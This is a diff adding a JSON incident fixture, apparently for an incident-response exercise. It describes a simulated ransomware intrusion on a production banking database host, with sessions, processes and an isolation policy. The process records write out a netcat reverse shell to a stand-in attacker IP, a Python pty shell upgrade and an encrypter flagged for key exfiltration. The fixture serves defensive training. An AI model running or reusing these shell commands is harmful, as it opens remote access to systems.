@@ -1,0 +1,60 @@
+{
+  "host_metadata": {
+    "hostname": "srv-prod-db01.sqrock.internal",
+    "primary_ip": "10.0.4.15",
+    "mac_address": "00:50:56:b3:4f:21",
+    "os_version": "Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)",
+    "environment": "Production / Core Banking Data Tier",
+    "datacenter": "DC-EAST-US-01"
+  },
+  "incident_context": {
+    "incident_id": "INC-2026-9042",
+    "trigger_time": "2026-11-17T10:48:12Z",
+    "trigger_rule": "HIDS-RANSOM-009",
+    "threat_actor_ip": "198.51.100.99",
+    "severity": "CRITICAL",
+    "threat_summary": "Active ransomware encryption canary tripped in /data/canary_vault/. Suspicious Python reverse shell beaconing outbound to port 4444."
+  },
+  "active_sessions": [
+    {
+      "pid": 4812,
+      "user": "root",
+      "terminal": "pts/0",
+      "login_ip": "10.0.100.50",
+      "process": "sshd: root@pts/0",
+      "authorized_bastion": true
+    },
+    {
+      "pid": 9411,
+      "user": "www-data",
+      "terminal": "pts/2",
+      "login_ip": "198.51.100.99",
+      "process": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "authorized_bastion": false
+    }
+  ],
+  "suspicious_processes": [
+    {
+      "pid": 9412,
+      "name": "rev_shell_beacon",
+      "cmdline": "nc -e /bin/sh 198.51.100.99 4444",
+      "user": "www-data",
+      "parent_pid": 9411
+    },
+    {
+      "pid": 9415,
+      "name": "encrypter_worker",
+      "cmdline": "./crypt_runner --target /data/canary_vault/ --key-exfil",
+      "user": "www-data",
+      "parent_pid": 9411
+    }
+  ],
+  "isolation_policy": {
+    "allowed_bastion_ip": "10.0.100.50",
+    "allowed_ports": [22, 443],
+    "null_route_all_other_egress": true,
+    "drop_all_unauthorized_ingress": true,
+    "kill_unauthorized_sessions": true,
+    "capture_forensic_evidence": true
+  }
+}
